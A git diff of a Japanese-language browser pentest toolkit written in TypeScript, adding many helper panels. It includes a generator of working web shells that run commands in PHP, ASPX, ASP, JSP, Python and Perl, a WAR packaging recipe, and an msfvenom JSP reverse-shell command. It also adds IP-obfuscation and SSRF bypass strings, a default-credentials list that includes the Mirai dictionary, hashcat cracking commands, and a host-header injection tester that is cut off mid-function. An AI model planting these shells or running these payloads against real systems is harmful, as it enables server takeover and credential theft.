-        } catch (e) {
-          if ((e as Error).name === "AbortError") {
-            status("中断しました");
-            return;
-          }
-          out.value += `| ${i + 1} | ${b.title} | (エラー) | | ${String(e).slice(0, 40)} |\n`;
-        }
-      }
-      status(`完了: ${items.length} 件`);
-    } finally {
-      aiAbort = null;
-    }
-  });
-}
-
 // ===== 🐵 ユーザースクリプト (Tampermonkey 風) =====
 
 interface UserScript {
@@ -6115,8 +5772,8 @@ function renderUserScriptList(): void {
     const meta = parseUserScriptMeta(s.source);
     const li = document.createElement("li");
     li.style.cssText =
-      "padding:6px 8px;cursor:pointer;border-bottom:1px solid #eee;display:flex;align-items:center;gap:6px;" +
-      (s.id === usSelectedId ? "background:#e6f0ff;" : "");
+      "padding:6px 8px;cursor:pointer;border-bottom:1px solid #2c2c2c;display:flex;align-items:center;gap:6px;color:#ddd;" +
+      (s.id === usSelectedId ? "background:#2a3a55;" : "");
     const cb = document.createElement("input");
     cb.type = "checkbox";
     cb.checked = s.enabled;
@@ -8860,8 +8517,2450 @@ function setupPentestTool(): void {
   setupJwtSub();
   setupDnsSub();
   setupSensitiveFilesSub();
+  setupSubnetSub();
+  setupSecHeadersSub();
+  setupHttpMethodsSub();
+  setupCorsTesterSub();
+  setupOpenRedirectSub();
+  setupFormExtractorSub();
+  setupCookieAnalyzerSub();
+  setupSecretsScannerSub();
+  setupSubdomainSub();
+  setupWaybackSub();
+  setupCveLookupSub();
+  setupPayloadLibrarySub();
+  setupGtfoLolbasSub();
+  setupUsernameGenSub();
+  setupWordlistMutSub();
+  setupJwtBruteSub();
+  setupNtlmSub();
+  setupMsfvenomSub();
+  setupPrivescChecklistSub();
+  setupUuidSub();
+  setupIpObfSub();
+  setupWebShellSub();
+  setupCyclicSub();
+  setupRobotsSub();
+  setupHibpSub();
+  setupGraphQLSub();
+  setupEntropySub();
+  setupDefaultCredsSub();
+  setupOsintLinksSub();
+  setupHashcatBuilderSub();
+  setupHostHeaderSub();
+  setupGitExposureSub();
+  setupSourceMapSub();
+  setupMagicBytesSub();
+  setupFlagExtractSub();
+  setupRespDiffSub();
+  setupConfigSnippetSub();
   const cheat = document.getElementById("thm-cheat");
   if (cheat) cheat.textContent = THM_CHEAT;
+}
+
+// ===== 🧬 UUID / GUID =====
+function setupUuidSub(): void {
+  const inEl = document.getElementById("uuid-input") as HTMLInputElement | null;
+  const btn = document.getElementById("uuid-run") as HTMLButtonElement | null;
+  const gen = document.getElementById("uuid-gen") as HTMLButtonElement | null;
+  const out = document.getElementById("uuid-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", () => {
+    const v = (inEl?.value || "").trim().toLowerCase();
+    const m =
+      /^([0-9a-f]{8})-?([0-9a-f]{4})-?([0-9a-f]{4})-?([0-9a-f]{4})-?([0-9a-f]{12})$/.exec(
+        v,
+      );
+    if (!m) {
+      out.textContent = "UUID 形式ではありません";
+      return;
+    }
+    const ver = parseInt(m[3][0], 16);
+    const variantBits = parseInt(m[4][0], 16);
+    let variant = "Reserved";
+    if ((variantBits & 0b1000) === 0) variant = "NCS (legacy)";
+    else if ((variantBits & 0b1100) === 0b1000) variant = "RFC 4122";
+    else if ((variantBits & 0b1110) === 0b1100) variant = "Microsoft GUID";
+    const lines = [
+      `入力     : ${m[1]}-${m[2]}-${m[3]}-${m[4]}-${m[5]}`,
+      `Version  : ${ver}`,
+      `Variant  : ${variant}`,
+    ];
+    if (ver === 1) {
+      // v1: time + node MAC
+      const timeHex = m[3].slice(1) + m[2] + m[1]; // time-high/mid/low
+      const ts100ns = BigInt("0x" + timeHex);
+      const epoch1582 = BigInt("122192928000000000");
+      const ms = Number((ts100ns - epoch1582) / BigInt(10000));
+      lines.push(`Timestamp: ${new Date(ms).toISOString()}`);
+      lines.push(`Node MAC : ${m[5].match(/.{2}/g)?.join(":")}`);
+      const mcByte = parseInt(m[5].slice(0, 2), 16);
+      lines.push(`         (${mcByte & 1 ? "ランダム" : "実 MAC の可能性"})`);
+    } else if (ver === 4) {
+      lines.push(`(v4: ランダム生成 — 推測不能)`);
+    } else if (ver === 7) {
+      const tsHex = m[1] + m[2];
+      const ms = parseInt(tsHex, 16);
+      lines.push(`Timestamp: ${new Date(ms).toISOString()}`);
+    }
+    out.textContent = lines.join("\n");
+  });
+  gen?.addEventListener("click", () => {
+    const b = new Uint8Array(16);
+    crypto.getRandomValues(b);
+    b[6] = (b[6] & 0x0f) | 0x40;
+    b[8] = (b[8] & 0x3f) | 0x80;
+    const h = Array.from(b).map((x) => x.toString(16).padStart(2, "0"));
+    const u = `${h.slice(0, 4).join("")}-${h.slice(4, 6).join("")}-${h.slice(6, 8).join("")}-${h.slice(8, 10).join("")}-${h.slice(10, 16).join("")}`;
+    if (inEl) inEl.value = u;
+    out.textContent = `生成: ${u}`;
+  });
+}
+
+// ===== 🔢 IP 難読化 =====
+function setupIpObfSub(): void {
+  const inEl = document.getElementById("ipo-input") as HTMLInputElement | null;
+  const btn = document.getElementById("ipo-run") as HTMLButtonElement | null;
+  const out = document.getElementById("ipo-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", () => {
+    const v = (inEl?.value || "").trim();
+    const n = ipToInt(v);
+    if (isNaN(n)) {
+      out.textContent = "IPv4 アドレスを入力してください";
+      return;
+    }
+    const o = [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255];
+    const dec = n.toString(10);
+    const hex = "0x" + n.toString(16);
+    const lines = [
+      `元           : ${v}`,
+      `10進 (整数)  : http://${dec}/`,
+      `16進 (整数)  : http://${hex}/`,
+      `16進 (各octet): http://${o.map((x) => "0x" + x.toString(16)).join(".")}/`,
+      `8進 (各octet): http://${o.map((x) => "0" + x.toString(8)).join(".")}/`,
+      `混合         : http://${o[0]}.${o[1]}.${(o[2] << 8) | o[3]}/`,
+      `2 octet      : http://${o[0]}.${(o[1] << 16) | (o[2] << 8) | o[3]}/`,
+      `先頭ゼロ     : http://${o.map((x) => "0".repeat(3) + x).join(".")}/`,
+      `URL@bypass   : http://example.com@${v}/`,
+      `nip.io       : http://${v}.nip.io/`,
+      `xip.io       : http://${v}.xip.io/`,
+    ];
+    if (o[0] === 127) {
+      lines.push(``, `# SSRF / loopback 短縮表記`);
+      lines.push(`http://127.1/`);
+      lines.push(`http://0/`);
+      lines.push(`http://[::1]/`);
+      lines.push(`http://[::ffff:127.0.0.1]/`);
+    }
+    out.textContent = lines.join("\n");
+  });
+}
+
+// ===== 🐚 Web シェル スニペット =====
+const WEBSHELLS: Record<string, (p: string) => string> = {
+  php: (p) =>
+    `<?php // 1-liner web shell — 使用には書面同意必須\nif(isset($_REQUEST['${p}'])){ system($_REQUEST['${p}']); }\n// 例: http://victim/shell.php?${p}=id\n\n// 代替 (関数フィルタ回避)\n<?php @eval($_REQUEST['${p}']); ?>\n<?php @system($_REQUEST['${p}']); ?>\n<?php passthru($_REQUEST['${p}']); ?>\n<?php echo shell_exec($_REQUEST['${p}']); ?>\n<?=\`{$_GET['${p}']}\`?>`,
+  aspx: (p) =>
+    `<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<%\nstring c = Request["${p}"];\nif (!string.IsNullOrEmpty(c)) {\n  ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + c);\n  psi.RedirectStandardOutput = true; psi.UseShellExecute = false;\n  Process p = Process.Start(psi);\n  Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");\n}\n%>`,
+  asp: (p) =>
+    `<%\nDim oS\nSet oS = Server.CreateObject("WSCRIPT.SHELL")\nSet oE = oS.exec("cmd.exe /c " & Request("${p}"))\nResponse.Write("<pre>" & oE.StdOut.ReadAll() & "</pre>")\n%>`,
+  jsp: (p) =>
+    `<%@ page import="java.util.*,java.io.*"%>\n<%\nString c = request.getParameter("${p}");\nif (c != null) {\n  Process pr = Runtime.getRuntime().exec(new String[]{"sh","-c",c});\n  BufferedReader br = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n  String l;\n  out.println("<pre>");\n  while ((l = br.readLine()) != null) out.println(l);\n  out.println("</pre>");\n}\n%>`,
+  py: (p) =>
+    `#!/usr/bin/env python3\nimport cgi, subprocess, html\nprint("Content-Type: text/html\\n")\nf = cgi.FieldStorage()\nc = f.getvalue("${p}", "")\nif c:\n    r = subprocess.run(c, shell=True, capture_output=True, text=True)\n    print("<pre>" + html.escape(r.stdout + r.stderr) + "</pre>")`,
+  pl: (p) =>
+    `#!/usr/bin/perl\nuse CGI;\nmy $q = CGI->new;\nmy $c = $q->param('${p}');\nprint "Content-Type: text/html\\n\\n";\nif ($c) { print "<pre>" . \`$c\` . "</pre>"; }`,
+  war: () =>
+    `# WAR ファイル作成 (cmd.jsp を中に同梱)\n# 1) cmd.jsp を用意\ncat > cmd.jsp <<'EOF'\n<%@ page import="java.util.*,java.io.*"%>\n<% String c=request.getParameter("cmd");\nif(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",c});\nBufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));\nString l;out.println("<pre>");while((l=b.readLine())!=null)out.println(l);out.println("</pre>");}%>\nEOF\n# 2) jar / zip でパッケージ\njar -cvf shell.war cmd.jsp\n# または\nzip shell.war cmd.jsp\n# 3) Tomcat manager 等にデプロイ → /shell/cmd.jsp?cmd=id\n\n# msfvenom でも生成可能\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f war -o shell.war`,
+};
+function setupWebShellSub(): void {
+  const sel = document.getElementById("ws-lang") as HTMLSelectElement | null;
+  const par = document.getElementById("ws-param") as HTMLInputElement | null;
+  const out = document.getElementById("ws-out") as HTMLPreElement | null;
+  if (!sel || !out) return;
+  const render = (): void => {
+    const lang = sel.value;
+    const p = (par?.value || "cmd").trim() || "cmd";
+    const fn = WEBSHELLS[lang];
+    out.textContent = fn ? fn(p) : "";
+  };
+  sel.addEventListener("change", render);
+  par?.addEventListener("input", render);
+  render();
+}
+
+// ===== 🧨 Cyclic パターン =====
+function cyclicGen(len: number): string {
+  // Metasploit の pattern_create と同じ 4-byte ユニーク
+  const U = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+  const L = "abcdefghijklmnopqrstuvwxyz";
+  const D = "0123456789";
+  let s = "";
+  outer: for (const a of U)
+    for (const b of L)
+      for (const c of D) {
+        for (let i = 0; i < c.length || i === 0; i++) {
+          // pattern_create は 3rd を A-Za-z0-9, 4th を 0-9 ループ
+        }
+        for (const d of D) {
+          s += a + b + c + d;
+          if (s.length >= len) break outer;
+        }
+      }
+  return s.slice(0, len);
+}
+function cyclicFind(pattern: string, needle: string): number {
+  // needle が 0x で始まる16進(リトルエンディアン4byte想定)なら ASCII 文字に変換
+  let n = needle.trim();
+  if (/^0x[0-9a-f]+$/i.test(n)) {
+    const hex = n.slice(2).padStart(8, "0");
+    const bytes: string[] = [];
+    for (let i = hex.length - 2; i >= 0; i -= 2)
+      bytes.push(String.fromCharCode(parseInt(hex.slice(i, i + 2), 16)));
+    n = bytes.join("");
+  }
+  return pattern.indexOf(n);
+}
+function setupCyclicSub(): void {
+  const len = document.getElementById("cyc-len") as HTMLInputElement | null;
+  const gen = document.getElementById("cyc-gen") as HTMLButtonElement | null;
+  const find = document.getElementById("cyc-find") as HTMLInputElement | null;
+  const off = document.getElementById("cyc-off") as HTMLButtonElement | null;
+  const out = document.getElementById("cyc-out") as HTMLPreElement | null;
+  if (!gen || !off || !out) return;
+  let lastPattern = "";
+  gen.addEventListener("click", () => {
+    const n = Math.max(1, Math.min(20280, parseInt(len?.value || "200", 10)));
+    lastPattern = cyclicGen(n);
+    out.textContent = lastPattern;
+  });
+  off.addEventListener("click", () => {
+    if (!lastPattern) {
+      const n = Math.max(1, Math.min(20280, parseInt(len?.value || "200", 10)));
+      lastPattern = cyclicGen(n);
+    }
+    const needle = (find?.value || "").trim();
+    if (!needle) {
+      out.textContent = "EIP/RIP の値 (例: 0x37654136 または Aa6Ae) を入力";
+      return;
+    }
+    const idx = cyclicFind(lastPattern, needle);
+    out.textContent =
+      idx < 0
+        ? `❌ オフセット見つからず (パターン長 ${lastPattern.length} を増やすか、リトル/ビッグエンディアンを確認)`
+        : `✅ オフセット: ${idx} バイト\nパターン長: ${lastPattern.length}\n→ exploit 内で 'A'*${idx} + 'BBBB' でリターンアドレス上書きを確認`;
+  });
+}
+
+// ===== 🤖 robots.txt / sitemap =====
+function setupRobotsSub(): void {
+  const inEl = document.getElementById("rob-url") as HTMLInputElement | null;
+  const btn = document.getElementById("rob-run") as HTMLButtonElement | null;
+  const out = document.getElementById("rob-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    let base = (inEl?.value || "").trim();
+    if (!base) return;
+    base = base.replace(/\/+$/, "");
+    out.textContent = "取得中...";
+    const targets = [
+      "/robots.txt",
+      "/sitemap.xml",
+      "/sitemap_index.xml",
+      "/.well-known/security.txt",
+      "/.well-known/openid-configuration",
+      "/.well-known/host-meta",
+      "/humans.txt",
+      "/crossdomain.xml",
+      "/clientaccesspolicy.xml",
+    ];
+    const lines: string[] = [];
+    for (const path of targets) {
+      const url = base + path;
+      try {
+        const r = await fetch(url);
+        if (r.ok) {
+          const t = await r.text();
+          lines.push(
+            `=== ${url} (${r.status}) ===\n${t.slice(0, 4000)}${t.length > 4000 ? "\n…(truncated)" : ""}\n`,
+          );
+        } else {
+          lines.push(`--- ${url} → ${r.status}`);
+        }
+      } catch (e) {
+        lines.push(`!!! ${url} → ${String(e).slice(0, 80)}`);
+      }
+    }
+    out.textContent = lines.join("\n");
+  });
+}
+
+// ===== 🧪 HIBP k-anonymity =====
+async function sha1Hex(s: string): Promise<string> {
+  const buf = await crypto.subtle.digest("SHA-1", new TextEncoder().encode(s));
+  return Array.from(new Uint8Array(buf))
+    .map((b) => b.toString(16).padStart(2, "0"))
+    .join("")
+    .toUpperCase();
+}
+function setupHibpSub(): void {
+  const inEl = document.getElementById("hibp-pw") as HTMLInputElement | null;
+  const btn = document.getElementById("hibp-run") as HTMLButtonElement | null;
+  const out = document.getElementById("hibp-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const pw = inEl?.value || "";
+    if (!pw) return;
+    out.textContent = "ハッシュ化 & 問合せ中...";
+    try {
+      const h = await sha1Hex(pw);
+      const prefix = h.slice(0, 5);
+      const suffix = h.slice(5);
+      const r = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`, {
+        headers: { "Add-Padding": "true" },
+      });
+      if (!r.ok) throw new Error("HIBP: " + r.status);
+      const txt = await r.text();
+      const hit = txt
+        .split(/\r?\n/)
+        .map((l) => l.split(":"))
+        .find(([s]) => s.trim().toUpperCase() === suffix);
+      if (hit) {
+        out.textContent = `🚨 漏洩確認: このパスワードは ${parseInt(hit[1], 10).toLocaleString()} 回 漏洩データに登場しています\nSHA-1: ${h}`;
+      } else {
+        out.textContent = `✅ HIBP の漏洩データには登場していません\nSHA-1: ${h}`;
+      }
+    } catch (e) {
+      out.textContent = `エラー: ${String(e)}`;
+    }
+  });
+}
+
+// ===== 📡 GraphQL Introspection =====
+const GQL_INTROSPECTION = `query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated:true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated:true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }`;
+function setupGraphQLSub(): void {
+  const u = document.getElementById("gql-url") as HTMLInputElement | null;
+  const a = document.getElementById("gql-auth") as HTMLInputElement | null;
+  const btn = document.getElementById("gql-run") as HTMLButtonElement | null;
+  const out = document.getElementById("gql-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const url = (u?.value || "").trim();
+    if (!url) return;
+    out.textContent = "イントロスペクション送信中...";
+    const headers: Record<string, string> = {
+      "Content-Type": "application/json",
+    };
+    if (a?.value.trim()) headers["Authorization"] = a.value.trim();
+    try {
+      const r = await fetch(url, {
+        method: "POST",
+        headers,
+        body: JSON.stringify({ query: GQL_INTROSPECTION }),
+      });
+      const data = (await r.json()) as {
+        data?: {
+          __schema?: {
+            types?: {
+              name: string;
+              kind: string;
+              fields?: { name: string; args?: unknown[] }[];
+            }[];
+          };
+        };
+        errors?: { message: string }[];
+      };
+      if (data.errors) {
+        out.textContent = `⚠️ エラー (introspection 無効化済み?):\n${JSON.stringify(data.errors, null, 2)}`;
+        return;
+      }
+      const types = data.data?.__schema?.types || [];
+      const interesting = types.filter(
+        (t) =>
+          !t.name.startsWith("__") &&
+          (t.kind === "OBJECT" || t.kind === "INPUT_OBJECT"),
+      );
+      const summary = interesting
+        .map((t) => {
+          const flds = t.fields
+            ? "\n  " +
+              t.fields
+                .map(
+                  (f) => `${f.name}${f.args && f.args.length ? "(...)" : ""}`,
+                )
+                .join(", ")
+            : "";
+          return `[${t.kind}] ${t.name}${flds}`;
+        })
+        .join("\n");
+      out.textContent = `🚨 Introspection が有効です (${interesting.length} types)\n\n${summary}`;
+    } catch (e) {
+      out.textContent = `エラー: ${String(e)}`;
+    }
+  });
+}
+
+// ===== 🧮 Shannon エントロピー =====
+function setupEntropySub(): void {
+  const inEl = document.getElementById(
+    "ent-input",
+  ) as HTMLTextAreaElement | null;
+  const btn = document.getElementById("ent-run") as HTMLButtonElement | null;
+  const out = document.getElementById("ent-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", () => {
+    const s = inEl?.value || "";
+    if (!s) {
+      out.textContent = "";
+      return;
+    }
+    const counts: Record<string, number> = {};
+    for (const c of s) counts[c] = (counts[c] || 0) + 1;
+    const len = s.length;
+    let H = 0;
+    for (const k in counts) {
+      const p = counts[k] / len;
+      H -= p * Math.log2(p);
+    }
+    const charset =
+      (/[a-z]/.test(s) ? 26 : 0) +
+      (/[A-Z]/.test(s) ? 26 : 0) +
+      (/[0-9]/.test(s) ? 10 : 0) +
+      (/[^A-Za-z0-9]/.test(s) ? 32 : 0);
+    const bruteBits = len * Math.log2(charset || 1);
+    const guess =
+      H > 4.5
+        ? "高 (鍵/トークン候補)"
+        : H > 3.5
+          ? "中 (混合文字列)"
+          : H > 2.0
+            ? "低 (英単語/パスワード)"
+            : "極低 (繰返し/単一文字種)";
+    out.textContent =
+      `長さ           : ${len}\n` +
+      `ユニーク文字数 : ${Object.keys(counts).length}\n` +
+      `Shannon Entropy: ${H.toFixed(3)} bit/char\n` +
+      `総エントロピー : ${(H * len).toFixed(2)} bit\n` +
+      `Brute (charset推定): ${bruteBits.toFixed(1)} bit (charset=${charset})\n` +
+      `判定           : ${guess}`;
+  });
+}
+
+// ===== 🚪 デフォルト認証情報 =====
+const DEFAULT_CREDS: [string, string, string][] = [
+  ["Tomcat Manager", "tomcat", "tomcat / s3cret / admin / role1"],
+  ["Tomcat Manager", "admin", "admin / password / (空)"],
+  ["Jenkins", "admin", "admin / password / jenkins"],
+  [
+    "Jenkins (初期)",
+    "admin",
+    "$JENKINS_HOME/secrets/initialAdminPassword 参照",
+  ],
+  ["GitLab", "root", "5iveL!fe (古い) / 自動生成パスワード"],
+  ["Grafana", "admin", "admin"],
+  ["Kibana / Elasticsearch", "elastic", "changeme"],
+  ["MongoDB (古い)", "(なし)", "認証無効が既定 (< 3.6)"],
+  ["MySQL", "root", "(空) / root / mysql"],
+  ["MariaDB", "root", "(空) / root"],
+  ["PostgreSQL", "postgres", "postgres / (空) / admin"],
+  ["Redis", "(なし)", "認証無効が既定"],
+  ["Memcached", "(なし)", "認証無効が既定"],
+  ["RabbitMQ", "guest", "guest"],
+  ["phpMyAdmin", "root", "(空) / root"],
+  ["WordPress", "admin", "admin / password / wordpress"],
+  ["Joomla admin", "admin", "admin"],
+  ["Drupal admin", "admin", "admin"],
+  ["Webmin", "admin", "admin / root"],
+  ["cPanel", "root", "(購入時のもの) / 1q2w3e4r"],
+  ["Plesk", "admin", "setup / admin"],
+  ["pfSense", "admin", "pfsense"],
+  ["OPNsense", "root", "opnsense"],
+  ["Cisco IOS", "cisco", "cisco / admin"],
+  ["Cisco ASA", "(なし)", "enable: cisco"],
+  ["MikroTik RouterOS", "admin", "(空)"],
+  ["Ubiquiti UniFi", "ubnt", "ubnt"],
+  ["TP-Link Router", "admin", "admin"],
+  ["D-Link Router", "admin", "(空) / admin"],
+  ["Netgear Router", "admin", "password"],
+  ["ZTE Router", "admin", "admin / Zte521"],
+  ["Huawei Router", "telecomadmin", "admintelecom / admin"],
+  ["Asus Router", "admin", "admin"],
+  ["Linksys Router", "admin", "admin / (空)"],
+  ["BMC / IPMI / iLO", "ADMIN", "ADMIN / admin / calvin (Dell iDRAC)"],
+  ["Dell iDRAC", "root", "calvin"],
+  ["HPE iLO", "Administrator", "(シリアル裏面のシール)"],
+  ["Supermicro IPMI", "ADMIN", "ADMIN"],
+  ["Apache ActiveMQ", "admin", "admin"],
+  ["Apache Kafka Manager", "admin", "(なし — 外部公開注意)"],
+  ["JBoss / WildFly", "admin", "admin / jboss / changeme"],
+  ["WebLogic", "weblogic", "weblogic / weblogic1 / Oracle@123"],
+  ["WebSphere", "admin", "admin"],
+  ["Splunk", "admin", "changeme / admin"],
+  ["Nagios XI", "nagiosadmin", "PIXIE (旧) / 自動生成"],
+  ["Zabbix", "Admin", "zabbix"],
+  ["Sonatype Nexus", "admin", "admin123 / 自動生成 (3.17+)"],
+  ["JFrog Artifactory", "admin", "password"],
+  ["Solr admin", "(なし)", "認証無効が既定"],
+  ["Couchbase", "Administrator", "password"],
+  ["InfluxDB v1", "(なし)", "認証無効が既定"],
+  ["Redis (Sentinel)", "(なし)", "認証無効が既定"],
+  ["Cassandra", "cassandra", "cassandra"],
+  ["Neo4j", "neo4j", "neo4j (初回変更必須)"],
+  ["FTP (anonymous)", "anonymous", "anonymous@ / (空)"],
+  ["Telnet (組込み)", "root", "root / (空) / admin"],
+  ["VNC", "(なし)", "パスワード無し or password"],
+  ["RDP (Win XP評価版)", "Administrator", "(空)"],
+  ["printer (HP/Xerox)", "admin", "1234 / (空) / @0123456789"],
+  ["IP camera", "admin", "admin / 12345 / (空) / 888888"],
+  ["Hikvision", "admin", "12345"],
+  ["Dahua", "admin", "admin"],
+  [
+    "Mirai 標的辞書",
+    "root/admin/...",
+    "root:xc3511, root:vizxv, admin:admin, root:888888, ...",
+  ],
+  ["Docker Registry", "(なし)", "認証無効が既定 (要 nginx 前段)"],
+  ["Portainer", "admin", "(初回設定) / admin"],
+  ["Rancher", "admin", "admin"],
+  ["Kubernetes Dashboard", "(skip)", "RBAC 設定不備でフルアクセス"],
+];
+function setupDefaultCredsSub(): void {
+  const filt = document.getElementById("dc-filter") as HTMLInputElement | null;
+  const out = document.getElementById("dc-out") as HTMLPreElement | null;
+  if (!out) return;
+  const render = (): void => {
+    const f = (filt?.value || "").toLowerCase();
+    const rows = DEFAULT_CREDS.filter(([n]) =>
+      f ? n.toLowerCase().includes(f) : true,
+    );
+    out.textContent =
+      `${rows.length} 件\n\n` +
+      rows
+        .map(
+          ([n, u, p]) => `• ${n.padEnd(28)} user: ${u.padEnd(18)} pass: ${p}`,
+        )
+        .join("\n");
+  };
+  filt?.addEventListener("input", render);
+  render();
+}
+
+// ===== 🌀 OSINT クイック検索 =====
+function setupOsintLinksSub(): void {
+  const q = document.getElementById("osi-q") as HTMLInputElement | null;
+  const btn = document.getElementById("osi-run") as HTMLButtonElement | null;
+  const out = document.getElementById("osi-out") as HTMLDivElement | null;
+  if (!btn || !out) return;
+  const run = (): void => {
+    const v = (q?.value || "").trim();
+    if (!v) {
+      out.innerHTML = "";
+      return;
+    }
+    const e = encodeURIComponent(v);
+    const links: [string, string][] = [
+      [`Shodan`, `https://www.shodan.io/search?query=${e}`],
+      [`Shodan (host)`, `https://www.shodan.io/host/${e}`],
+      [`Censys`, `https://search.censys.io/search?resource=hosts&q=${e}`],
+      [`FOFA`, `https://en.fofa.info/result?qbase64=${btoa(`"${v}"`)}`],
+      [`ZoomEye`, `https://www.zoomeye.org/searchResult?q=${e}`],
+      [`VirusTotal`, `https://www.virustotal.com/gui/search/${e}`],
+      [`AbuseIPDB`, `https://www.abuseipdb.com/check/${e}`],
+      [`urlscan.io`, `https://urlscan.io/search/#${e}`],
+      [`SecurityTrails`, `https://securitytrails.com/list/apex_domain/${e}`],
+      [`crt.sh`, `https://crt.sh/?q=%25.${e}`],
+      [`DNSDumpster`, `https://dnsdumpster.com/`],
+      [
+        `AlienVault OTX`,
+        `https://otx.alienvault.com/browse/global/indicators?q=${e}`,
+      ],
+      [`GreyNoise`, `https://viz.greynoise.io/ip/${e}`],
+      [
+        `MXToolbox`,
+        `https://mxtoolbox.com/SuperTool.aspx?action=mx&run=toolpage&q=${e}`,
+      ],
+      [`whois (whois.com)`, `https://www.whois.com/whois/${e}`],
+      [`Wayback Machine`, `https://web.archive.org/web/*/${e}`],
+      [`Google dork`, `https://www.google.com/search?q=site%3A${e}`],
+      [`GitHub`, `https://github.com/search?q=${e}&type=code`],
+      [`HIBP (email)`, `https://haveibeenpwned.com/account/${e}`],
+      [`Hunter.io`, `https://hunter.io/search/${e}`],
+      [`Gravatar`, `https://en.gravatar.com/${e}`],
+    ];
+    out.innerHTML =
+      `<div style="display:flex;flex-wrap:wrap;gap:6px">` +
+      links
+        .map(
+          ([n, u]) =>
+            `<a href="${u}" target="_blank" style="color:#60a5fa;padding:6px 10px;border:1px solid #2c2c2c;border-radius:4px;background:#1f1f1f;text-decoration:none">${escapeHtml(n)}</a>`,
+        )
+        .join("") +
+      `</div>`;
+  };
+  btn.addEventListener("click", run);
+  q?.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") run();
+  });
+}
+
+// ===== 🧰 hashcat / john ビルダー =====
+function detectHashcatMode(h: string): { mode: string; name: string } | null {
+  const x = h.trim();
+  if (/^[a-f0-9]{32}$/i.test(x)) return { mode: "0", name: "MD5" };
+  if (/^[a-f0-9]{40}$/i.test(x)) return { mode: "100", name: "SHA1" };
+  if (/^[a-f0-9]{64}$/i.test(x)) return { mode: "1400", name: "SHA256" };
+  if (/^[a-f0-9]{128}$/i.test(x)) return { mode: "1700", name: "SHA512" };
+  if (/^\$1\$/.test(x)) return { mode: "500", name: "md5crypt" };
+  if (/^\$5\$/.test(x)) return { mode: "7400", name: "sha256crypt" };
+  if (/^\$6\$/.test(x)) return { mode: "1800", name: "sha512crypt" };
+  if (/^\$2[abxy]\$/.test(x)) return { mode: "3200", name: "bcrypt" };
+  if (/^\$argon2/.test(x)) return { mode: "13300", name: "Argon2 (要 -m)" };
+  if (/^[A-Z0-9]+:[a-f0-9]{32}:[a-f0-9]{32}/i.test(x))
+    return { mode: "5600", name: "NetNTLMv2" };
+  if (/^\$krb5tgs\$/i.test(x))
+    return { mode: "13100", name: "Kerberos TGS-REP" };
+  if (/^\$krb5asrep\$/i.test(x))
+    return { mode: "18200", name: "Kerberos AS-REP (AS-REP roast)" };
+  if (/^eyJ[A-Za-z0-9_-]+\./.test(x))
+    return { mode: "16500", name: "JWT (HS256)" };
+  return null;
+}
+function setupHashcatBuilderSub(): void {
+  const h = document.getElementById("hc-hash") as HTMLInputElement | null;
+  const m = document.getElementById("hc-mode") as HTMLSelectElement | null;
+  const out = document.getElementById("hc-out") as HTMLPreElement | null;
+  if (!out) return;
+  const run = (): void => {
+    const hv = (h?.value || "").trim();
+    if (!hv) {
+      out.textContent = "";
+      return;
+    }
+    let mode = m?.value || "auto";
+    let name = "";
+    if (mode === "auto") {
+      const d = detectHashcatMode(hv);
+      if (!d) {
+        out.textContent = "自動判定失敗。モードを手動選択してください";
+        return;
+      }
+      mode = d.mode;
+      name = ` (検出: ${d.name})`;
+    }
+    const lines = [
+      `# hashcat${name}`,
+      `echo '${hv}' > hash.txt`,
+      ``,
+      `# 辞書`,
+      `hashcat -m ${mode} -a 0 hash.txt /usr/share/wordlists/rockyou.txt`,
+      ``,
+      `# 辞書 + ルール`,
+      `hashcat -m ${mode} -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`,
+      ``,
+      `# ブルートフォース (?a = all)`,
+      `hashcat -m ${mode} -a 3 hash.txt ?a?a?a?a?a?a?a?a --increment`,
+      ``,
+      `# マスク (8文字, 英小+数字)`,
+      `hashcat -m ${mode} -a 3 hash.txt ?l?l?l?l?l?l?d?d`,
+      ``,
+      `# 結果表示`,
+      `hashcat -m ${mode} hash.txt --show`,
+      ``,
+      `# john the ripper (互換 — フォーマット自動判定)`,
+      `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`,
+      `john --show hash.txt`,
+    ];
+    out.textContent = lines.join("\n");
+  };
+  h?.addEventListener("input", run);
+  m?.addEventListener("change", run);
+}
+
+// ===== 🪞 Host Header injection =====
+function setupHostHeaderSub(): void {
+  const u = document.getElementById("hh-url") as HTMLInputElement | null;
+  const a = document.getElementById("hh-attacker") as HTMLInputElement | null;
+  const btn = document.getElementById("hh-run") as HTMLButtonElement | null;
+  const out = document.getElementById("hh-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const url = (u?.value || "").trim();
+    const evil = (a?.value || "evil.com").trim();
+    if (!url) return;
+    out.textContent = "テスト中...";
+    const headers: [string, Record<string, string>][] = [
